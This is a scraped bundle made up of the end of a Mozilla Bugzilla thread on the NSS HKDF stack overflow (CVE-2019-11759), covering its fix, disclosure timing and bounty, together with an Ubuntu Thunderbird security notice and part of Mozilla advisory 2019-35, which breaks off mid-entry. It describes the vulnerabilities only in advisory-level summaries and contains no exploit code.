|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2251682_280903)• 5 years ago |

[Attachment #9091567](/attachment.cgi?id=9091567&action=edit "Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs") -
Flags: sec-approval? → sec-approval+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2299204_75935)• 5 years ago |

[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
[71+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=71%2B) → [70+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=70%2B)

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2320315_520206)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019]

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2375737_600971)• 5 years ago |

[Attachment #9091567](/attachment.cgi?id=9091567&action=edit "Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs") -
Attachment description: Bug 1577953 - Allocate space for longer HKDF expansions when necessary → Bug 1577953 - Support longer (up to RFC maximum) HKDF outputs

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1577953#c12)• 5 years ago |
|  | |

Re exploitability, for what it's worth: I just clicked my proof of concept and got a "Gah. Your tab just crashed." screen. Ubuntu 16.04.6 LTS, Firefox 69.0.1 (Ubuntu-provided package), x64.

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1577953#c13)• 5 years ago |
|  | |

<https://hg.mozilla.org/projects/nss/rev/c0913ad7a5609751a8dfc37ae2e0a7a0cd6a42dd>

Status: ASSIGNED → RESOLVEDClosed: 5 years agoResolution: --- → FIXEDTarget Milestone: --- → 3.47

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2733978_520206)• 5 years ago |

Flags: in-testsuite?

|  | [Kevin Jacobs [:kjacobs]](/user_profile?user_id=636914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2734411_636914)• 5 years ago |

Blocks: [1585429](/show_bug.cgi?id=1585429 "RESOLVED FIXED - Tests for bug 1577953")

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1577953#c14)• 5 years ago |
|  | |

Comment on [attachment 9091889](/attachment.cgi?id=9091889 "Bug 1577953 - Add HKDF test vectors") [[details]](/attachment.cgi?id=9091889&action=edit "Bug 1577953 - Add HKDF test vectors")

[Bug 1577953](/show_bug.cgi?id=1577953 "RESOLVED FIXED - HKDF SHA1 stack buffer overflow (write)") - Add HKDF test vectors

Revision D45434 was moved to [bug 1585429](/show_bug.cgi?id=1585429 "RESOLVED FIXED - Tests for bug 1577953"). Setting [attachment 9091889](/attachment.cgi?id=9091889 "Bug 1577953 - Add HKDF test vectors") [[details]](/attachment.cgi?id=9091889&action=edit "Bug 1577953 - Add HKDF test vectors") to obsolete.

[Attachment #9091889](/attachment.cgi?id=9091889&action=edit "Bug 1577953 - Add HKDF test vectors") -
Attachment is obsolete: true

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2906511_75935)• 5 years ago |

[status-firefox67](/buglist.cgi?f1=cf_status_firefox67&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=wontfix)
[status-firefox68](/buglist.cgi?f1=cf_status_firefox68&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix)
[status-firefox71](/buglist.cgi?f1=cf_status_firefox71&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=fixed)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a2960817_580382)• 5 years ago |

[status-firefox70](/buglist.cgi?f1=cf_status_firefox70&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=fixed)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a3003594_1689)• 5 years ago |

Group: crypto-core-security → core-security-release

|  | [Guido Vranken](/user_profile?user_id=569399)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1577953#c15)• 5 years ago |
|  | |

Some things are not entirely clear to me:

-> Firefox 69.0.2 landed after the fix was committed, but the changelog doesn't mention it: <https://www.mozilla.org/en-US/firefox/69.0.2/releasenotes/> . Will it be included in the next release?

-> I'd like to add this and the other NSS bugs I found to my public Cryptofuzz Hall of Fame (<https://github.com/guidovranken/cryptofuzz#hall-of-fame>). Now that the fixes have been committed, can I mention the bugs publicly or should I wait until the Bugzilla reports are made public?

-> Now that the bug(s) have been confirmed, fixed and their severity established, will someone be contacting me about the bug bounty?

Thanks

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a3249085_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1577953#c16)• 5 years ago |
|  | |

It will be in Firefox 70, currently Firefox Beta. It missed 70b12 last week (narrowly) but it was in today's 70b13 build. It will also be in the next release of Firefox ESR, coming out on 22 October.

I think we would prefer to wait to disclose until Firefox 70 is released on 22 October - Dan, can you check me on that?

Flags: needinfo?(dveditz)

|  | [J.C. Jones [:jcj] (he/they)](/user_profile?user_id=520206) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1577953#c17)• 5 years ago |
|  | |

^

Flags: needinfo?(dveditz) → needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1577953#c18)• 5 years ago |
|  | |

Thanks JC.

(In reply to Guido Vranken from [comment #15](/show_bug.cgi?id=1577953#c15 "RESOLVED FIXED - HKDF SHA1 stack buffer overflow (write)"))

> -> I'd like to add this and the other NSS bugs I found to my public Cryptofuzz Hall of Fame (<https://github.com/guidovranken/cryptofuzz#hall-of-fame>). Now that the fixes have been committed, can I mention the bugs publicly or should I wait until the Bugzilla reports are made public?

We would prefer that details of the issue not be published until this bugzilla bug becomes public. Typically that happens shortly after the release of the version with the fix.

> -> Now that the bug(s) have been confirmed, fixed and their severity established, will someone be contacting me about the bug bounty?

You should have gotten an email from me yesterday. =)

Flags: needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a3518634_578488)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019] → [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019][adv-main70+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a3544729_578488)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019][adv-main70+] → [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019][adv-main70+][adv-esr68.2+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1577953#c19)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9100551)
— [Details](attachment.cgi?id=9100551&action=edit)

|  | [Bogdan Maris, Desktop Test Engineering](/user_profile?user_id=458188) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a3846856_458188)• 5 years ago |

Flags: qe-verify+Whiteboard: [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019][adv-main70+][adv-esr68.2+] → [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019][adv-main70+][adv-esr68.2+][post-critsmash-triage]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a4460090_578488)• 5 years ago |

Alias: CVE-2019-11759

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a16242785_75935)• 5 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] [land 2 Oct 2019][adv-main70+][adv-esr68.2+][post-critsmash-triage] → [reporter-external] [client-bounty-form] [verif?][adv-main70+][adv-esr68.2+][post-critsmash-triage]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a24122189_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1577953#a149868799_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1577953&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Guido Vranken](/user_profile?user_id=569399)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from usn.ubuntu.com_65cb1c48_20250121_000032.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4335-1: Thunderbird vulnerabilities

21 April 2020

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

Multiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted website in a browsing context,

an attacker could potentially exploit these to cause a denial of service,

obtain sensitive information, bypass security restrictions, bypass

same-origin restrictions, conduct cross-site scripting (XSS) attacks, or

execute arbitrary code. ([CVE-2019-11757](/security/CVE-2019-11757), [CVE-2019-11758](/security/CVE-2019-11758), [CVE-2019-11759](/security/CVE-2019-11759),

[CVE-2019-11760](/security/CVE-2019-11760), [CVE-2019-11761](/security/CVE-2019-11761), [CVE-2019-11762](/security/CVE-2019-11762), [CVE-2019-11763](/security/CVE-2019-11763),

[CVE-2019-11764](/security/CVE-2019-11764), [CVE-2019-17005](/security/CVE-2019-17005), [CVE-2019-17008](/security/CVE-2019-17008), [CVE-2019-17010](/security/CVE-2019-17010),

[CVE-2019-17011](/security/CVE-2019-17011), [CVE-2019-17012](/security/CVE-2019-17012), [CVE-2019-17016](/security/CVE-2019-17016), [CVE-2019-17017](/security/CVE-2019-17017),

[CVE-2019-17022](/security/CVE-2019-17022), [CVE-2019-17024](/security/CVE-2019-17024), [CVE-2019-17026](/security/CVE-2019-17026), [CVE-2019-20503](/security/CVE-2019-20503),

[CVE-2020-6798](/security/CVE-2020-6798), [CVE-2020-6800](/security/CVE-2020-6800), [CVE-2020-6805](/security/CVE-2020-6805), [CVE-2020-6806](/security/CVE-2020-6806), [CVE-2020-6807](/security/CVE-2020-6807),

[CVE-2020-6812](/security/CVE-2020-6812), [CVE-2020-6814](/security/CVE-2020-6814), [CVE-2020-6819](/security/CVE-2020-6819), [CVE-2020-6820](/security/CVE-2020-6820), [CVE-2020-6821](/security/CVE-2020-6821),

[CVE-2020-6825](/security/CVE-2020-6825))

It was discovered that NSS incorrectly handled certain memory operations.

A remote attacker could potentially exploit this to cause a denial of

service, or execute arbitrary code. ([CVE-2019-11745](/security/CVE-2019-11745))

It was discovered that a specially crafted S/MIME message with an inner

encryption layer could be displayed as having a valid signature in some

circumstances, even if the signer had no access to the encrypted message.

An attacker could potentially exploit this to spoof the message author.

([CVE-2019-11755](/security/CVE-2019-11755))

A heap overflow was discovered in the expat library in Thunderbird. If a

user were tricked in to opening a specially crafted message, an attacker

could potentially exploit this to cause a denial of service, or execute

arbitrary code. ([CVE-2019-15903](/security/CVE-2019-15903))

It was discovered that Message ID calculation was based on uninitialized

data. An attacker could potentially exploit this to obtain sensitive

information. ([CVE-2020-6792](/security/CVE-2020-6792))

Mutiple security issues were discovered in Thunderbird. If a user were

tricked in to opening a specially crafted message, an attacker could

potentially exploit these to cause a denial of service, obtain sensitive

information, or execute arbitrary code. ([CVE-2020-6793](/security/CVE-2020-6793), [CVE-2020-6795](/security/CVE-2020-6795),

[CVE-2020-6822](/security/CVE-2020-6822))

It was discovered that if a user saved passwords before Thunderbird 60 and

then later set a primary password, an unencrypted copy of these passwords

would still be accessible. A local user could exploit this to obtain

sensitive information. ([CVE-2020-6794](/security/CVE-2020-6794))

It was discovered that the Devtools’ ‘Copy as cURL’ feature did not

fully escape website-controlled data. If a user were tricked in to using

the ‘Copy as cURL’ feature to copy and paste a command with specially

crafted data in to a terminal, an attacker could potentially exploit this

to execute arbitrary commands via command injection. ([CVE-2020-6811](/security/CVE-2020-6811))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [thunderbird](https://launchpad.net/ubuntu/%2Bsource/thunderbird)
  -
  [1:68.7.0+build1-0ubuntu0.16.04.2](https://launchpad.net/ubuntu/%2Bsource/thunderbird/1%3A68.7.0%2Bbuild1-0ubuntu0.16.04.2)

After a standard system update you need to restart Thunderbird to make

all the necessary changes.

## References

* [CVE-2019-11745](/security/CVE-2019-11745)
* [CVE-2019-11755](/security/CVE-2019-11755)
* [CVE-2019-11757](/security/CVE-2019-11757)
* [CVE-2019-11758](/security/CVE-2019-11758)
* [CVE-2019-11759](/security/CVE-2019-11759)
* [CVE-2019-11760](/security/CVE-2019-11760)
* [CVE-2019-11761](/security/CVE-2019-11761)
* [CVE-2019-11762](/security/CVE-2019-11762)
* [CVE-2019-11763](/security/CVE-2019-11763)
* [CVE-2019-11764](/security/CVE-2019-11764)
* [CVE-2019-15903](/security/CVE-2019-15903)
* [CVE-2019-17005](/security/CVE-2019-17005)
* [CVE-2019-17008](/security/CVE-2019-17008)
* [CVE-2019-17010](/security/CVE-2019-17010)
* [CVE-2019-17011](/security/CVE-2019-17011)
* [CVE-2019-17012](/security/CVE-2019-17012)
* [CVE-2019-17016](/security/CVE-2019-17016)
* [CVE-2019-17017](/security/CVE-2019-17017)
* [CVE-2019-17022](/security/CVE-2019-17022)
* [CVE-2019-17024](/security/CVE-2019-17024)
* [CVE-2019-17026](/security/CVE-2019-17026)
* [CVE-2019-20503](/security/CVE-2019-20503)
* [CVE-2020-6792](/security/CVE-2020-6792)
* [CVE-2020-6793](/security/CVE-2020-6793)
* [CVE-2020-6794](/security/CVE-2020-6794)
* [CVE-2020-6795](/security/CVE-2020-6795)
* [CVE-2020-6798](/security/CVE-2020-6798)
* [CVE-2020-6800](/security/CVE-2020-6800)
* [CVE-2020-6805](/security/CVE-2020-6805)
* [CVE-2020-6806](/security/CVE-2020-6806)
* [CVE-2020-6807](/security/CVE-2020-6807)
* [CVE-2020-6811](/security/CVE-2020-6811)
* [CVE-2020-6812](/security/CVE-2020-6812)
* [CVE-2020-6814](/security/CVE-2020-6814)
* [CVE-2020-6819](/security/CVE-2020-6819)
* [CVE-2020-6820](/security/CVE-2020-6820)
* [CVE-2020-6821](/security/CVE-2020-6821)
* [CVE-2020-6822](/security/CVE-2020-6822)
* [CVE-2020-6825](/security/CVE-2020-6825)

## Related notices

* [USN-4216-2](/security/notices/USN-4216-2)
* [USN-4216-1](/security/notices/USN-4216-1)
* [USN-4241-1](/security/notices/USN-4241-1)
* [USN-4203-1](/security/notices/USN-4203-1)
* [USN-4203-2](/security/notices/USN-4203-2)
* [USN-4202-1](/security/notices/USN-4202-1)
* [USN-4165-1](/security/notices/USN-4165-1)
* [USN-4132-2](/security/notices/USN-4132-2)
* [USN-4132-1](/security/notices/USN-4132-1)
* [USN-4852-1](/security/notices/USN-4852-1)
* [USN-5455-1](/security/notices/USN-5455-1)
* [USN-7199-1](/security/notices/USN-7199-1)
* [USN-4234-1](/security/notices/USN-4234-1)
* [USN-4328-1](/security/notices/USN-4328-1)
* [USN-4299-1](/security/notices/USN-4299-1)
* [USN-4278-1](/security/notices/USN-4278-1)
* [USN-4278-2](/security/notices/USN-4278-2)
* [USN-4317-1](/security/notices/USN-4317-1)
* [USN-4323-1](/security/notices/USN-4323-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from www.mozilla.org_47501c29_20250121_000033.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-35

## Security vulnerabilities fixed in - Thunderbird 68.2

Announced
October 22, 2019
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 68.2

#### [#CVE-2019-15903: Heap overflow in expat library in XML\_GetCurrentLineNumber](#CVE-2019-15903)

Reporter
Sebastian Pipping
Impact
high
##### Description

In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early. A subsequent call to `XML_GetCurrentLineNumber` or `XML_GetCurrentColumnNumber` then resulted in a heap-based buffer over-read.

##### References

* [Bug 1584907](https://bugzilla.mozilla.org/show_bug.cgi?id=1584907)

#### [#CVE-2019-11757: Use-after-free when creating index updates in IndexedDB](#CVE-2019-11757)

Reporter
Zhanjia Song
Impact
high
##### Description

When following the value's prototype chain, it was possible to retain a reference to a locale, delete it, and subsequently reference it. This resulted in a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1577107](https://bugzilla.mozilla.org/show_bug.cgi?id=1577107)

#### [#CVE-2019-11758: Potentially exploitable crash due to 360 Total Security](#CVE-2019-11758)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla community member Philipp reported a memory safety bug present in Firefox 68 when 360 Total Security was installed. This bug showed evidence of memory corruption in the accessibility engine and we presume that with enough effort that it could be exploited to run arbitrary code.

##### References

* [Bug 1536227](https://bugzilla.mozilla.org/show_bug.cgi?id=1536227)

#### [#CVE-2019-11759: Stack buffer overflow in HKDF output](#CVE-2019-11759)

Reporter
Guido Vranken
Impact
moderate
##### Description

